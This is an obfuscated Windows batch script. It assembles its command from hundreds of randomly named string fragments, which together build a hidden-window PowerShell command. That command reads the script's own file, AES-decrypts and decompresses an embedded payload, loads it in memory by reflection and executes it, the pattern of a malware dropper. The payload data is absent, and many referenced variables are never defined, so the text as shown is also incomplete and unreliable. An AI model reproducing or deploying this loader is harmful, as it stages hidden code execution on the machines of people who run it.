@echo off
!ylcZRSaazKhvJNCRmVDB! "rjmgCVoCln=_var"
!ylcZRSaazKhvJNCRmVDB! "HGtJttCgbN=decr"
!ylcZRSaazKhvJNCRmVDB! "GNjsqDfHou=int;"
!ylcZRSaazKhvJNCRmVDB! "hInoprleNj=ar=$"
!ylcZRSaazKhvJNCRmVDB! "mrwSBaGANf=r.Tr"
!ylcZRSaazKhvJNCRmVDB! "FUIZqzkGWb=w-Ob"
!ylcZRSaazKhvJNCRmVDB! "uvcOAHbQTk=))	{"
!ylcZRSaazKhvJNCRmVDB! "OKOUxWmfia=e]::"
!ylcZRSaazKhvJNCRmVDB! "naAXwUoYsn= ('%*'"
!ylcZRSaazKhvJNCRmVDB! "dNvFFnYhdk=$jsC"
!ylcZRSaazKhvJNCRmVDB! "pIjBedrwPI=.Ent"
!ylcZRSaazKhvJNCRmVDB! "qIYMqyZGzb=).Sp"
!ylcZRSaazKhvJNCRmVDB! "JGLjBQsZqC=TTL "
!ylcZRSaazKhvJNCRmVDB! "FljTSjAcLb=KN.D"
!ylcZRSaazKhvJNCRmVDB! "ttQfpXDxLW=ptog"
!ylcZRSaazKhvJNCRmVDB! "FJGRDwhlDo=UWYo"
!ylcZRSaazKhvJNCRmVDB! "zzflofhkhH=ZipS"
!ylcZRSaazKhvJNCRmVDB! "EPRLTEBkbm=tor("
!ylcZRSaazKhvJNCRmVDB! "mxEXtZIEEB=('gn"
!ylcZRSaazKhvJNCRmVDB! "vErkiMbfpC=onve"
!ylcZRSaazKhvJNCRmVDB! "DWBcZsGWSr=null"
!ylcZRSaazKhvJNCRmVDB! "NGlIbBqBLq=rofi"
!ylcZRSaazKhvJNCRmVDB! "nzZjndflpd=Syst"
!ylcZRSaazKhvJNCRmVDB! "yVqSGMqGYY=ode]"
!ylcZRSaazKhvJNCRmVDB! "aluvYsoCXt=.Dis"
!ylcZRSaazKhvJNCRmVDB! "ZPSgndghdQ=decr"
!ylcZRSaazKhvJNCRmVDB! "OLNTOAtcHK=S46e"
!ylcZRSaazKhvJNCRmVDB! "OsmtLVDDvJ=Stre"
!ylcZRSaazKhvJNCRmVDB! "rJugWACATw=rt]:"
!ylcZRSaazKhvJNCRmVDB! "eGWxqMczfP=('da"
!ylcZRSaazKhvJNCRmVDB! "AjSDlKxkWW=..-1"
!ylcZRSaazKhvJNCRmVDB! "gbQLaFmSfn=ecur"
!ylcZRSaazKhvJNCRmVDB! "wIqWxLmjSb=oL'["
!ylcZRSaazKhvJNCRmVDB! "RnOpjCzRkB=Invo"
!ylcZRSaazKhvJNCRmVDB! "ZFswowuoTL= Sys"
!ylcZRSaazKhvJNCRmVDB! "fvJHBAWXxp=on ("
!ylcZRSaazKhvJNCRmVDB! "JjTZkJrfBm=.Cip"
!ylcZRSaazKhvJNCRmVDB! "tKQKwAfHdf=yloa"
!ylcZRSaazKhvJNCRmVDB! "pWchSWwQxe=Crea"
!ylcZRSaazKhvJNCRmVDB! "RqhdahxRQc=;exe"
!ylcZRSaazKhvJNCRmVDB! "dxcxkvPwor=Key="
!ylcZRSaazKhvJNCRmVDB! "IsjQmsaZWF=r[1]"
!ylcZRSaazKhvJNCRmVDB! "ARrSrmOXbK=TIKN"
!ylcZRSaazKhvJNCRmVDB! "GuKjWvbmyk='[-1"
!ylcZRSaazKhvJNCRmVDB! "poJZXuWdNW=tion"
!ylcZRSaazKhvJNCRmVDB! "ExRqSSRcIW=nd f"
!ylcZRSaazKhvJNCRmVDB! "fVMkLrdngf=essi"
!ylcZRSaazKhvJNCRmVDB! "OtXaKDXyDr=join"
!ylcZRSaazKhvJNCRmVDB! "KjsORxevxW=NlcP"
!ylcZRSaazKhvJNCRmVDB! "ozNvftLdQU=IO.F"
!ylcZRSaazKhvJNCRmVDB! "nXQJwkREOD= '')"
!ylcZRSaazKhvJNCRmVDB! "uVlNccSwyq=tem."
!ylcZRSaazKhvJNCRmVDB! "GYnnNVsNKt=Conv"
!ylcZRSaazKhvJNCRmVDB! "XRbqrNwofq=in '"
!ylcZRSaazKhvJNCRmVDB! "kceMUPBWwE=ryPo"
!ylcZRSaazKhvJNCRmVDB! "dMSNhHdPDl=trin"
!ylcZRSaazKhvJNCRmVDB! "dshZoPaFxV=	$ae"
!ylcZRSaazKhvJNCRmVDB! "aosrogVMzG=PKCS"
!ylcZRSaazKhvJNCRmVDB! "BIPZHcvOdr=$par"
!ylcZRSaazKhvJNCRmVDB! "cjBKeeIRnz=e();"
!ylcZRSaazKhvJNCRmVDB! "GakhzWKMQj=rn_v"
!ylcZRSaazKhvJNCRmVDB! "exHaHHwdVC=am(,"
!ylcZRSaazKhvJNCRmVDB! "MUtvLVLLqQ=2_va"
!ylcZRSaazKhvJNCRmVDB! "logmEoocHN=;	$a"
!ylcZRSaazKhvJNCRmVDB! "GWjxUInMqD=mpre"
!ylcZRSaazKhvJNCRmVDB! "edXCOOeJrw=m.IO"
!ylcZRSaazKhvJNCRmVDB! "HUEJKyKlBK=aylo"
!ylcZRSaazKhvJNCRmVDB! "cBHZyaIRMl=0jgH"
!ylcZRSaazKhvJNCRmVDB! "kBQycRaFUL=$pay"
!ylcZRSaazKhvJNCRmVDB! "UCLWIpNsnJ=C;	$"
!ylcZRSaazKhvJNCRmVDB! "wFwAMvXUjI=IO.C"
!ylcZRSaazKhvJNCRmVDB! "KzqmQrijyq=func"
!ylcZRSaazKhvJNCRmVDB! "bdvurzDQIb=Bloc"
!ylcZRSaazKhvJNCRmVDB! "XjTtXBPebs=6] -"
!ylcZRSaazKhvJNCRmVDB! "BFuzrhVAos=var)"
!ylcZRSaazKhvJNCRmVDB! "OXNaqzYUcs=ar=d"
!ylcZRSaazKhvJNCRmVDB! "sNmlmsQEJK=ile]"
!ylcZRSaazKhvJNCRmVDB! "vEAmNWYign=ypt_"
!ylcZRSaazKhvJNCRmVDB! "ngfdAlSMXa=6n/F"
!ylcZRSaazKhvJNCRmVDB! "MUVycWHCPF=n ''"
!ylcZRSaazKhvJNCRmVDB! "RVHULVrcys=unct"
!ylcZRSaazKhvJNCRmVDB! "QIbBDXYkuq=Leng"
!ylcZRSaazKhvJNCRmVDB! "YcqvttpahT=rn_v"
!ylcZRSaazKhvJNCRmVDB! "FngmAYWCno=NsK."
!ylcZRSaazKhvJNCRmVDB! "caafRLtPNf=_fun"
!ylcZRSaazKhvJNCRmVDB! "EGlMMQvXAa=m.Re"
!ylcZRSaazKhvJNCRmVDB! "EFlmcEytOc=tion"
!ylcZRSaazKhvJNCRmVDB! "iVQhwcFFfa=ompr"
!ylcZRSaazKhvJNCRmVDB! "eaZKCVRFiS=es_v"
!ylcZRSaazKhvJNCRmVDB! "lfpyuFiiGQ=To($"
!ylcZRSaazKhvJNCRmVDB! "KvxMlqSCuQ=yloa"
!ylcZRSaazKhvJNCRmVDB! "XmHrJyhLdn=ar);"
!ylcZRSaazKhvJNCRmVDB! "tyCVxJluhT=trin"
!ylcZRSaazKhvJNCRmVDB! "qpswFoooOJ=ecur"
!ylcZRSaazKhvJNCRmVDB! "QjjPBIPdPa=tion"
!ylcZRSaazKhvJNCRmVDB! "dyADhOYUMr=]]$p"
!ylcZRSaazKhvJNCRmVDB! "sjpgBIpwFq=cryp"
!ylcZRSaazKhvJNCRmVDB! "yJMcLYzXat=lit("
!ylcZRSaazKhvJNCRmVDB! "rWyKojTySa=:: '"
!ylcZRSaazKhvJNCRmVDB! "EQMHDDikib=..-1"
!ylcZRSaazKhvJNCRmVDB! "WEzaOuYfAf=ctio"
!ylcZRSaazKhvJNCRmVDB! "RmgcMlGHdL=aphy"
!ylcZRSaazKhvJNCRmVDB! "zLzIgaotJT=morF"
!ylcZRSaazKhvJNCRmVDB! "criuJLEiwQ='%~f0'"
!ylcZRSaazKhvJNCRmVDB! "pjQsWeeRrE=func"
!ylcZRSaazKhvJNCRmVDB! "exOKZYfylr=ram_"
!ylcZRSaazKhvJNCRmVDB! "TwOHKVwzvT=TTL."
!ylcZRSaazKhvJNCRmVDB! "CfXSoyXjfc=rF'["
!ylcZRSaazKhvJNCRmVDB! "rKOdOABitW=m($d"
!ylcZRSaazKhvJNCRmVDB! "ZZPvRCHtUY=deco"
!ylcZRSaazKhvJNCRmVDB! "LBxJNOdDjB=teDe"
!ylcZRSaazKhvJNCRmVDB! "AeZquBLOzF=cryp"
!ylcZRSaazKhvJNCRmVDB! "HigtuCEYla=ach "
!ylcZRSaazKhvJNCRmVDB! "MWLjwwIUmv=null"
!ylcZRSaazKhvJNCRmVDB! "BGMymyweRA=] -j"
!ylcZRSaazKhvJNCRmVDB! "dbDrZVunzc=g(3)"
!ylcZRSaazKhvJNCRmVDB! "PamcNDQNYo=Star"
!ylcZRSaazKhvJNCRmVDB! "yqsxemzihf=unct"
!ylcZRSaazKhvJNCRmVDB! "tulVPSNlLf=aes_"
!ylcZRSaazKhvJNCRmVDB! "UFjJhlzlYJ=[Sys"
!ylcZRSaazKhvJNCRmVDB! "aaCQtvheMg=.-16"
!ylcZRSaazKhvJNCRmVDB! "MhfcDlkzwP=rray"
!ylcZRSaazKhvJNCRmVDB! "eoTUIdIpRg=r_va"
!ylcZRSaazKhvJNCRmVDB! "RCRZxNzXIQ=raph"
!ylcZRSaazKhvJNCRmVDB! "YmOrZsLppg=tion"
!ylcZRSaazKhvJNCRmVDB! "ylIydzxsWI=se()"
!ylcZRSaazKhvJNCRmVDB! "gEFTsLMRFp=tem."
!ylcZRSaazKhvJNCRmVDB! "fveoxQBaqd=s_fu"
!ylcZRSaazKhvJNCRmVDB! "TzAMlJgUDD=togr"
!ylcZRSaazKhvJNCRmVDB! "isVmxzCfaq=wTit"
!ylcZRSaazKhvJNCRmVDB! "HwwvQnteQy=Disp"
!ylcZRSaazKhvJNCRmVDB! "soGxQYzCBZ=CuG."
!ylcZRSaazKhvJNCRmVDB! "uYvPYZdNzX=y]::"
!ylcZRSaazKhvJNCRmVDB! "MukeRvreEB==$an"
!ylcZRSaazKhvJNCRmVDB! "VcwxRWvHae=ctio"
!ylcZRSaazKhvJNCRmVDB! "ZYtomlPpvT=ing="
!ylcZRSaazKhvJNCRmVDB! "ayfLlUfYvp=Zzp6"
!ylcZRSaazKhvJNCRmVDB! "VihVEyTPLl=aeR'"
!ylcZRSaazKhvJNCRmVDB! "AwudrtsuGZ=llAd"
!ylcZRSaazKhvJNCRmVDB! "FJZkilWsTh=t]::"
!ylcZRSaazKhvJNCRmVDB! "rojXirfCfm=;$pa"
!ylcZRSaazKhvJNCRmVDB! "BxrTcEPdbo=ute_"
!ylcZRSaazKhvJNCRmVDB! "nqGlAqcEoq=omma"
!ylcZRSaazKhvJNCRmVDB! "HIVxpxHeOM=ess_"
!ylcZRSaazKhvJNCRmVDB! "eclDOUpCOZ=	$de"
!ylcZRSaazKhvJNCRmVDB! "DRFkBkNJGp=ion "
!ylcZRSaazKhvJNCRmVDB! "YJzmzKYPDU=aphy"
!ylcZRSaazKhvJNCRmVDB! "gdegrUMRzY=ispo"
!ylcZRSaazKhvJNCRmVDB! "QuTejUmHSO=th('"
!ylcZRSaazKhvJNCRmVDB! "jNVnPtiRAe=yste"
!ylcZRSaazKhvJNCRmVDB! "fDKzNiWRxV=_var"
!ylcZRSaazKhvJNCRmVDB! "LaIAAqevmE=le ="
!ylcZRSaazKhvJNCRmVDB! "OLblOYTxWy=);$p"
!ylcZRSaazKhvJNCRmVDB! "uexbzNwIKe=ne);"
!ylcZRSaazKhvJNCRmVDB! "tdgmDZbwnh=indo"
!ylcZRSaazKhvJNCRmVDB! "nizxufqQBG=aram"
!ylcZRSaazKhvJNCRmVDB! "UEKOPIAxot=ject"
!ylcZRSaazKhvJNCRmVDB! "UWInWtjRJT=on.G"
!ylcZRSaazKhvJNCRmVDB! "XhhMxHTPhQ=();}"
!ylcZRSaazKhvJNCRmVDB! "QPQIyMGNNE=.Aes"
!ylcZRSaazKhvJNCRmVDB! "BcZVkovCGr=.-11"
!ylcZRSaazKhvJNCRmVDB! "VgypVllAji=ad1_"
!ylcZRSaazKhvJNCRmVDB! "rTpaBdrGtA=owst"
!ylcZRSaazKhvJNCRmVDB! "rknXZVNemh=_fun"
!ylcZRSaazKhvJNCRmVDB! "dikYWqzaUs=Copy"
!ylcZRSaazKhvJNCRmVDB! "LWjrmOSbsx=aes_"
!ylcZRSaazKhvJNCRmVDB! "ZHIYrXHKJp=G=Ne"
!ylcZRSaazKhvJNCRmVDB! "CsMQCrVXgU=Disp"
!ylcZRSaazKhvJNCRmVDB! "cFgaDeBvWM=ram2"
!ylcZRSaazKhvJNCRmVDB! "ZohNYMdlCy=iPxV"
!ylcZRSaazKhvJNCRmVDB! "bkdZxrdSBr=EtbP"
!ylcZRSaazKhvJNCRmVDB! "iEGNVCxmHQ=func"
!ylcZRSaazKhvJNCRmVDB! "JTsPnIhVbU=-4] "
!ylcZRSaazKhvJNCRmVDB! "QtvwCiSBvM=));"
!ylcZRSaazKhvJNCRmVDB! "NpbHCCDmcH=yloa"
!ylcZRSaazKhvJNCRmVDB! "tSFzhLbTtL=h=[S"
!ylcZRSaazKhvJNCRmVDB! "VCZSUtriTo=r);}"
!ylcZRSaazKhvJNCRmVDB! "OIbsFTxMTy=plit"
!ylcZRSaazKhvJNCRmVDB! "KtIPTNGSMr=.Ass"
!ylcZRSaazKhvJNCRmVDB! "RtHGXTOhnk=;	$d"
!ylcZRSaazKhvJNCRmVDB! "jvyZlMHysm=-joi"
!ylcZRSaazKhvJNCRmVDB! "nZdwNpkUvy=g[]]"
!ylcZRSaazKhvJNCRmVDB! "PbUActdkBQ=:('g"
!ylcZRSaazKhvJNCRmVDB! "upsaQWzFkf=TTL."
!ylcZRSaazKhvJNCRmVDB! "JCgcSPAKRN=nTIK"
!ylcZRSaazKhvJNCRmVDB! "CtFRRbUpwg=')('"
!ylcZRSaazKhvJNCRmVDB! "tYECsjprKN=var "
!ylcZRSaazKhvJNCRmVDB! "IDoONwVcWv={	$d"
!ylcZRSaazKhvJNCRmVDB! "ZdtoKhhWkH=decr"
!ylcZRSaazKhvJNCRmVDB! "zIjCYSrkSX=var."
!ylcZRSaazKhvJNCRmVDB! "SelHVMbsxN=('rH"
!ylcZRSaazKhvJNCRmVDB! "iLMBBAFJXw=em.S"
!ylcZRSaazKhvJNCRmVDB! "EPXvuutbqM=e]::"
!ylcZRSaazKhvJNCRmVDB! "cBChrTDXZl= $pa"
!ylcZRSaazKhvJNCRmVDB! "HVAQeOPBAy= $pa"
!ylcZRSaazKhvJNCRmVDB! "ojJTPEYaLn=]::C"
!ylcZRSaazKhvJNCRmVDB! "NfyCWaTcUy=();	"
!ylcZRSaazKhvJNCRmVDB! "GEVgHneQJg=ar $"
!ylcZRSaazKhvJNCRmVDB! "EYRkRxYczr=mpre"
!ylcZRSaazKhvJNCRmVDB! "zXboCPLbwN=O.Co"
!ylcZRSaazKhvJNCRmVDB! "kWxKpsMGfJ=func"
!ylcZRSaazKhvJNCRmVDB! "ZBzOOcAKxM=herM"
!ylcZRSaazKhvJNCRmVDB! "ypPQulInjH=togr"
!ylcZRSaazKhvJNCRmVDB! "XYToHjDCth=load"
!ylcZRSaazKhvJNCRmVDB! "EIjJjqUnup=ncti"
!ylcZRSaazKhvJNCRmVDB! "EyQbyurSqS=Secu"
!ylcZRSaazKhvJNCRmVDB! "EsntivhVsy=-1.."
!ylcZRSaazKhvJNCRmVDB! "zNDZInQTml=cute"
!ylcZRSaazKhvJNCRmVDB! "Nhcstrogvi=sPow"
!ylcZRSaazKhvJNCRmVDB! "wFIeMuCcZW="%systemdrive%"
!ylcZRSaazKhvJNCRmVDB! "tgRvptKxGM=exe""
!ylcZRSaazKhvJNCRmVDB! "oiDsCsBJXq=tem3"
!ylcZRSaazKhvJNCRmVDB! "QWgqxWoKoG=erSh"
!ylcZRSaazKhvJNCRmVDB! "BQXymCKtGu=\Sys"
!ylcZRSaazKhvJNCRmVDB! "eDtaQNqQNC=ersh"
!ylcZRSaazKhvJNCRmVDB! "zRyXBrFdHa=dows"
!ylcZRSaazKhvJNCRmVDB! "EJkmeXTuNc=ell."
!ylcZRSaazKhvJNCRmVDB! "uaRlFQMEWi=ell\"
!ylcZRSaazKhvJNCRmVDB! "CEBmkFhKCv=2\Wi"
!ylcZRSaazKhvJNCRmVDB! "jlgTNyBIMH=\Win"
!ylcZRSaazKhvJNCRmVDB! "OyvYvtoHHl=ndow"
!ylcZRSaazKhvJNCRmVDB! "rapuESreAz=\pow"
!ylcZRSaazKhvJNCRmVDB! "yIdwdBAcVQ= "
!ylcZRSaazKhvJNCRmVDB! "eTcMDvCiTS=v1.0"
%wFIeMuCcZW%%jlgTNyBIMH%%zRyXBrFdHa%%BQXymCKtGu%%oiDsCsBJXq%%CEBmkFhKCv%%OyvYvtoHHl%%Nhcstrogvi%%QWgqxWoKoG%%uaRlFQMEWi%%eTcMDvCiTS%%rapuESreAz%%eDtaQNqQNC%%EJkmeXTuNc%%tgRvptKxGM%%yIdwdBAcVQ%%AkGJqxUtTe%%NGlIbBqBLq%%YoXoOEtFhm%%IAiSpLAKGd%%rTpaBdrGtA%%TCRhrmnsVM%%dplHwnystq%%aFVIZfYWMK%%mNmHsgJaBc%%xiOTZcHIEo%%FZndznGjil%%nqGlAqcEoq%%ExRqSSRcIW%%yqsxemzihf%%zzRpOhCDsI%%ZdtoKhhWkH%%vEAmNWYign%%RUwiQeGBCL%%poJZXuWdNW%%fDXAJUZFCR%%itweRfHlxG%%BFuzrhVAos%%ZUvjinWVyW%%eaZKCVRFiS%%NLGgvzjxiC%%ZyqjRnYnVD%%iLMBBAFJXw%%qpswFoooOJ%%eyMWXGKQSo%%XEJEJbZfFU%%TzAMlJgUDD%%YJzmzKYPDU%%QPQIyMGNNE%%ojJTPEYaLn%%APmppnfweZ%%cjBKeeIRnz%%dshZoPaFxV%%LYepuaCBsl%%GjJNCfIZOL%%VgMlkhInaA%%nzZjndflpd%%BhzcSTJtxj%%gbQLaFmSfn%%rpBRYhjzAy%%ZwJKjNGKtr%%ypPQulInjH%%RmgcMlGHdL%%JjTZkJrfBm%%ZBzOOcAKxM%%yVqSGMqGYY%%hZGHHovQGK%%UCLWIpNsnJ%%LWjrmOSbsx%%tKhDeaVRgA%%HJdNSWjukr%%ZYtomlPpvT%%vuyjrjviSI%%uVlNccSwyq%%EyQbyurSqS%%kGwnemlUwJ%%BbBBWdMGlk%%ttQfpXDxLW%%RCRZxNzXIQ%%QYZPOCWpeu%%HLGfzRPqYh%%JOiARYjCej%%EPXvuutbqM%%aosrogVMzG%%YiZBhcPzXQ%%tulVPSNlLf%%xOZmhuvRlK%%dxcxkvPwor%%EUdAtFcxBv%%tKaujjiNuM%%GYnnNVsNKt%%cqWtACLzSB%%rXpPrswHob%%mccCKGGPNx%%mpNitcNGUG%%yJUSuIIxWu%%zLzIgaotJT%%VVLvpckhwo%%EQMHDDikib%%XjTtXBPebs%%OtXaKDXyDr%%yBbHPJYRfD%%SelHVMbsxN%%ngfdAlSMXa%%FJGRDwhlDo%%CXYyAJiqeX%%BEaPervXhE%%QlUfXixudz%%FQPjkphHDQ%%cBHZyaIRMl%%bkdZxrdSBr%%mOmFsLPREP%%kOtrBoEUGW%%AGHRxuMPLT%%logmEoocHN%%lQmXbnQMxi%%MjlEQGgvhX%%YagKDVHhNn%%aBnTLJtJQk%%EZrCgcdBvX%%hTUJOlKBug%%FJZkilWsTh%%mxEXtZIEEB%%SgMPfgHDeA%%ZRpJFUagtV%%gKInLKoXqP%%CfXSoyXjfc%%EsntivhVsy%%YBlIvhyyeu%%RJnpXTTxvg%%XRbqrNwofq%%CtFRRbUpwg%%ayfLlUfYvp%%BKzlAgAUrI%%KjsORxevxW%%YEaofyMqfw%%HyTQOSTtqK%%BaYOvRgrTN%%PJAzqWKlfc%%ujOUamqCZZ%%EKeNvXGlSo%%svwsHXXtzS%%hInoprleNj%%BErTifFNet%%qysRJZNwnc%%pWchSWwQxe%%LBxJNOdDjB%%sjpgBIpwFq%%EPRLTEBkbm%%IPqaHObJdV%%WkmLJfHVFj%%GakhzWKMQj%%mSBXTDTpzM%%HGtJttCgbN%%XFFSFIEiAK%%eoTUIdIpRg%%mrwSBaGANf%%tELclHnIrl%%ZKOOItMybp%%LnoVBFjMqF%%bdvurzDQIb%%QZYGgBCIji%%nizxufqQBG%%yBsMjWpuwj%%PWPazLpHOZ%%cBChrTDXZl%%jNpcCoHmwk%%lilasrszXJ%%QIbBDXYkuq%%ssulZcGNxk%%eclDOUpCOZ%%AeZquBLOzF%%qwRfSSNZaq%%LFbMFOxyMJ%%HwwvQnteQy%%rSoRUHlfLV%%gqByoVcmKG%%dmbPYTawpE%%zIjCYSrkSX%%CsMQCrVXgU%%lgtjveQyTa%%HOPhwxgZAv%%ESuNeLAkmH%%YcqvttpahT%%cSqRqODEuf%%kWxKpsMGfJ%%EFlmcEytOc%%igSGsLCCwp%%iVQhwcFFfa%%HIVxpxHeOM%%pjQsWeeRrE%%QjjPBIPdPa%%YToNvAkuqV%%exOKZYfylr%%YOnBkxyfWG%%IDoONwVcWv%%TJAwAsvzPC%%DrSyckFNDX%%bfyKnAiZWD%%dcBPxooQaR%%cZqtdrLQMD%%RizYuOkQjZ%%kvCmyBPcaN%%WOMLUcPeHV%%OsmtLVDDvJ%%exHaHHwdVC%%BIPZHcvOdr%%ZfjnlRijAD%%XmHrJyhLdn%%FLjftfCnLJ%%zPzdJYotPQ%%ymCrEpbyqj%%VKKPLnWdTf%%pVxRdiMEHL%%jNVnPtiRAe%%edXCOOeJrw%%ckAKACPLov%%CxRFZhPxas%%feDPalXVco%%edmlJYnkMm%%DwDfBHmsCG%%ZHIYrXHKJp%%FUIZqzkGWb%%UEKOPIAxot%%ZFswowuoTL%%qDAxHJOEOb%%wFwAMvXUjI%%xkvqqZBmKU%%fVMkLrdngf%%UWInWtjRJT%%zzflofhkhH%%hBTUWBTlPv%%rKOdOABitW%%QKCQuFQBWF%%jSfyXscOqv%%zXboCPLbwN%%EYRkRxYczr%%KroklzEpfv%%xNSXxSIooE%%TOfjblbVHA%%taoZKhJRcc%%lwVapQgTNZ%%OKOUxWmfia%%yIIFcxySnp%%jQlltxSeUk%%ehiHLJmtCO%%UEIcEDOpYR%%soGxQYzCBZ%%dikYWqzaUs%%lfpyuFiiGQ%%JCgcSPAKRN%%jJSDLMtKgo%%dNvFFnYhdk%%PqVLpAbhgg%%POihiBmMNH%%lxcsNVhAwE%%RtHGXTOhnk%%LlEZyoFowe%%aluvYsoCXt%%sBLBowhBjp%%NfyCWaTcUy%%qTesEFYlHE%%FljTSjAcLb%%gdegrUMRzY%%ylIydzxsWI%%yVTFKBWFKM%%ARrSrmOXbK%%SgMJgtDKQs%%MhfcDlkzwP%%XhhMxHTPhQ%%KzqmQrijyq%%YmOrZsLppg%%cpBlMLZZly%%zNDZInQTml%%caafRLtPNf%%WEzaOuYfAf%%rjYaRkJOJM%%BScddbpvua%%rjmgCVoCln%%oLshTTcaoH%%cFgaDeBvWM%%fDKzNiWRxV%%VgCwyQzVjk%%ZohNYMdlCy%%tSFzhLbTtL%%WkCsLVcKCN%%EGlMMQvXAa%%fLoZCdAdoM%%OFCynPMObc%%KtIPTNGSMr%%pdtsGlVDPI%%uYvPYZdNzX%%eGWxqMczfP%%wIqWxLmjSb%%UiZtHLXSQU%%JTsPnIhVbU%%jvyZlMHysm%%MUVycWHCPF%%OjIlgCpBJO%%EqhXSyJZhV%%dyADhOYUMr%%bEfwfZNnTI%%xgODIwNXFE%%mHvUBpJeds%%EuOsNZlKST%%KwgyxXJWVL%%bbohetjlUP%%pIjBedrwPI%%kceMUPBWwE%%GNjsqDfHou%%QZQcDbmEuu%%FngmAYWCno%%RnOpjCzRkB%%XKhvSkmbiS%%DWBcZsGWSr%%GDtZCDlATb%%CvuTxUfKup%%MUtvLVLLqQ%%VCZSUtriTo%%ZLigphCHFe%%nVBCEMkYnG%%RzjcgZwBZe%%DWRfqaMmfE%%tdgmDZbwnh%%isVmxzCfaq%%LaIAAqevmE%%aXSJnNtXzh%%YanRVlbEIQ%%yGmPSsvFLn%%UFjJhlzlYJ%%gEFTsLMRFp%%ozNvftLdQU%%sNmlmsQEJK%%LQGYKUatxh%%GEawZuROEO%%AwudrtsuGZ%%VihVEyTPLl%%srGJoNNPmR%%BcZVkovCGr%%BGMymyweRA%%BcctviQLPE%%GChPxTimLp%%criuJLEiwQ%%qIYMqyZGzb%%yJMcLYzXat%%pksBxjUIJK%%DIpZnXEvzZ%%TCNJRtEgJL%%mHhdAgpwog%%ErXOyQuNON%%uexbzNwIKe%%FNYXyVAmyg%%HigtuCEYla%%YRrVqhkgDN%%JGLjBQsZqC%%qipIgmXeGX%%iyxJfNwdHq%%LtIKxawXSD%%kEHJKQBJPe%%jfAFEljbdN%%upsaQWzFkf%%PamcNDQNYo%%mMnChGScfl%%QuTejUmHSO%%rWyKojTySa%%uvcOAHbQTk%%dwzZovghSS%%riVkXqoDnX%%MukeRvreEB%%TwOHKVwzvT%%cLFaJlASRk%%tyCVxJluhT%%dbDrZVunzc%%TPhuUaPkvF%%UznuhuUTkb%%JcrCQbinbO%%RnsOqEqiaw%%TbYCYENjjE%%aBdytRxEET%%SBjHOGgydD%%dMSNhHdPDl%%nZdwNpkUvy%%gMDhEsSrNs%%xofGAoIqqL%%OIbsFTxMTy%%wmdEwriLiP%%OLblOYTxWy%%HUEJKyKlBK%%VgypVllAji%%gXhBXdGPDH%%ZZPvRCHtUY%%GWjxUInMqD%%NtoOrJMdMH%%RVHULVrcys%%DRFkBkNJGp%%PUzaTGKbdh%%PEHnhLopMY%%rknXZVNemh%%VcwxRWvHae%%kpZqDYkscP%%VyWIXFHCbY%%TGOWlMikvl%%pHoIOblXub%%KubwlxgOzm%%pTGckDBceQ%%PaWRAokoTW%%tJiZnzFrLO%%GuKjWvbmyk%%AjSDlKxkWW%%nRUCTFLGOL%%YjqpjvpNVe%%nXQJwkREOD%%buvPBPAhpq%%KvxMlqSCuQ%%uJoSJpblgI%%OhSlKEOBOu%%UhxEuSAdxf%%rojXirfCfm%%NpbHCCDmcH%%CqOaVmlKyQ%%OXNaqzYUcs%%ylvBGFgQbR%%pobQDbzicW%%fveoxQBaqd%%EIjJjqUnup%%fvJHBAWXxp%%ZPSgndghdQ%%efAXmGerGm%%gmOMQKLxNX%%TDDadPQdwg%%jNjElZULuV%%vErkiMbfpC%%rJugWACATw%%PbUActdkBQ%%QZcRBomsRr%%OLNTOAtcHK%%xuRXfuJQiP%%IREyMrGCFH%%nkICIenbLB%%aaCQtvheMg%%EwjcIXgohx%%UQxZxmMppb%%hIfGOHoNfq%%kBQycRaFUL%%XYToHjDCth%%JSPLZWqDoa%%IsjQmsaZWF%%lhvDdjORYF%%eLuYHrLfzg%%BxrTcEPdbo%%iEGNVCxmHQ%%hyEIVXXkiV%%HVAQeOPBAy%%tKQKwAfHdf%%UzxIZcSIYf%%GEVgHneQJg%%MWLjwwIUmv%%RqhdahxRQc%%VhCvRPPKci%%wpYWsYOnmC%%tYvDnqwRfA%%PmZGlEtqsG%%GYRdYCslLc%%tjEoIXLZhA%%tYECsjprKN%%FyVGVvgsEK%%YkgdhGIKYn%%TtiRnItpLP%%naAXwUoYsn%%QtvwCiSBvM%
!ylcZRSaazKhvJNCRmVDB! "yWXIKBhHDH=exit"
!ylcZRSaazKhvJNCRmVDB! "hYNArFrePD= /b"
%yWXIKBhHDH%%hYNArFrePD%
